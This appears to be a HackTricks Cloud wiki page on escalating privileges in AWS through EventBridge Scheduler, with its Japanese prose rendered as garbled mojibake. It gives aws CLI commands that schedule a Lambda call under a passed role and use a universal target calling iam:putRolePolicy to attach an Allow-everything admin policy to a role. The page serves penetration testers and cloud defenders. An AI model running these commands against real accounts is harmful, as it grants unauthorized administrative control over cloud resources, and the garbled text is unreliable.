# AWS - EventBridge Scheduler Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EventBridge Scheduler

EventBridge Schedulerã¯ã€ã•ã¾ã–ã¾ãªAWSã‚µãƒ¼ãƒ“ã‚¹ã¸ã®å‘¼ã³å‡ºã—ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã™ã‚‹ã“ã¨ã§ç‰¹æ¨©æ˜‡æ ¼ã«ä½¿ç”¨ã§ãã¾ã™ã€‚ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã«åŸºã¥ã„ã¦ã‚µãƒ¼ãƒ“ã‚¹ã‚’å‘¼ã³å‡ºã™èƒ½åŠ›ã‚’æ´»ç”¨ã™ã‚‹ã“ã¨ã§ã€ååˆ†ãªæ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚EventBridge SchedulerãŒãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒˆãƒªã‚¬ãƒ¼ã§ãã‚‹ä¸»ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®ã„ãã¤ã‹ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

- Lambda: lambda:InvokeFunction - ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã«å¾“ã£ã¦Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚
- CodeBuild: codebuild:StartBuild - AWS CodeBuildãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’é–‹å§‹ã—ã¾ã™ã€‚
- CodePipeline: codepipeline:StartPipelineExecution - AWS CodePipelineã®å®Ÿè¡Œã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã™ã€‚
- ECS: ecs:RunTask - ECSã‚¿ã‚¹ã‚¯ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚
- EventBridge: events:PutEvents - EventBridgeã«ã‚¤ãƒ™ãƒ³ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚
- Inspector: inspector:StartAssessmentRun - Amazon Inspectorã®è©•ä¾¡ã‚’é–‹å§‹ã—ã¾ã™ã€‚
- Kinesis: kinesis:PutRecord - Kinesisã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚
- Firehose: firehose:PutRecord - Firehoseé…ä¿¡ã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ãƒ¬ã‚³ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¾ã™ã€‚
- SageMaker: sagemaker:StartPipelineExecution - SageMakerãƒ‘ã‚¤ãƒ—ãƒ©ã‚¤ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã—ã¾ã™ã€‚
- SNS: sns:Publish - SNSãƒˆãƒ”ãƒƒã‚¯ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’å…¬é–‹ã—ã¾ã™ã€‚
- SQS: sqs:SendMessage - SQSã‚­ãƒ¥ãƒ¼ã«ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ã€‚
- Step Functions: states:StartExecution - AWS Step Functionsã®å®Ÿè¡Œã‚’é–‹å§‹ã—ã¾ã™ã€‚

ã“ã‚Œã‚‰ã¯EventBridge SchedulerãŒå®Ÿè¡Œã§ãã‚‹ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®ä¸€éƒ¨ã«éãã¾ã›ã‚“ã€‚ãŸã ã—ã€ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€AWSã‚µãƒ¼ãƒ“ã‚¹å…¨ä½“ã§å¤šãã®ä»–ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸãƒªã‚¹ãƒˆã‚’è¶…ãˆãŸã‚ˆã‚Šåºƒç¯„ãªAPIæ“ä½œã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚

EventBridge Schedulerã®è©³ç´°ã«ã¤ã„ã¦ã¯ï¼š

{% content-ref url="../aws-services/eventbridgescheduler-enum.md" %}
[eventbridgescheduler-enum.md](../aws-services/eventbridgescheduler-enum.md)
{% endcontent-ref %}

### `sts:AssumeRole`, `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

`sts:AssumeRole`ã€`iam:PassRole`ã€ãŠã‚ˆã³`scheduler:CreateSchedule`ã¾ãŸã¯`scheduler:UpdateSchedule`ã®æ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€EventBridge Schedulerã‚’åˆ©ç”¨ã—ã¦ã€ã‚ˆã‚Šé«˜ã„æ¨©é™ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã‚µãƒ¼ãƒ“ã‚¹ã‚’å‘¼ã³å‡ºã™ã“ã¨ã§ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€æ˜‡æ ¼ã•ã‚ŒãŸæ¨©é™ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã‚’å¼•ãå—ã‘ã€ãã®ãƒ­ãƒ¼ãƒ«ã‚’EventBridge Schedulerã«æ¸¡ã—ã¦ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ä½œæˆã¾ãŸã¯æ›´æ–°ã§ãã¾ã™ã€‚ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã¯ã€Lambdaé–¢æ•°ã®å‘¼ã³å‡ºã—ã€ECSã‚¿ã‚¹ã‚¯ã®é–‹å§‹ã€CodePipelineã®å®Ÿè¡Œã®ãƒˆãƒªã‚¬ãƒ¼ã€ã¾ãŸã¯EventBridge SchedulerãŒã‚µãƒãƒ¼ãƒˆã™ã‚‹270ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã®ã„ãšã‚Œã‹ã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«æ§‹æˆã§ãã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯é«˜ã„æ¨©é™ã‚’æ‚ªç”¨ã—ã¦AWSã‚µãƒ¼ãƒ“ã‚¹å…¨ä½“ã§ä¸æ­£ãªæ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
\\

ãŸã¨ãˆã°ã€å½¼ã‚‰ã¯ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’è¨­å®šã—ã¦ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã§ã‚ã‚‹Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã™ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
EventBridge Schedulerã§ã¯ã€ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆåŒ–ã•ã‚ŒãŸã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã«åŠ ãˆã¦ã€ã•ã¾ã–ã¾ãªAWSã‚µãƒ¼ãƒ“ã‚¹ã®APIæ“ä½œã‚’å‘¼ã³å‡ºã™ãŸã‚ã«ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’ä½¿ç”¨ã§ãã¾ã™ã€‚ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã¯ã€ã»ã¼ã™ã¹ã¦ã®APIã‚’å‘¼ã³å‡ºã™æŸ”è»Ÿæ€§ã‚’æä¾›ã—ã¾ã™ã€‚1ã¤ã®ä¾‹ã¯ã€ã€ŒputRolePolicyã€ãƒãƒªã‚·ãƒ¼ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ŒAdminAccessPolicyã€ã‚’è¿½åŠ ã™ã‚‹ãƒ¦ãƒ‹ãƒãƒ¼ã‚µãƒ«ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ï¼š
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## å‚è€ƒæ–‡çŒ®

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)

* [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
